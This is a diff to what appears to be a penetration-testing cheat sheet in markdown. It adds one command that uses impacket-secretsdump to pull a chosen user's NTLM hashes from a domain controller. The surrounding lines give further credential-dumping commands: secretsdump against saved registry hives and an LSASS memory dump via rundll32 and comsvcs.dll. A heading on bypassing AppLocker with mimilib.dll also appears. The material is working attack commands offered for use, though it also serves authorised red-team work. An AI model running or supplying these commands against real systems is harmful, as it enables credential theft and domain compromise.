@@ -563,6 +563,8 @@ If you have path traversal plus a location with write access you can exploit tha
   `# secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`   
 - Using PowerShell:   
   `Powershell -c rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump [process ID of lsass.exe] c:\temp\candies.bin full`   
+- Extract specific users creds from DC:   
+  `impacket-secretsdump 'domain.local/username:password'@<DC-IP> -just-dc-user <username> -just-dc-ntlm`   
     
 ## Bypass Applocker
 - Bypass Applocker with mimilib.dll to run arbitrary executables:  
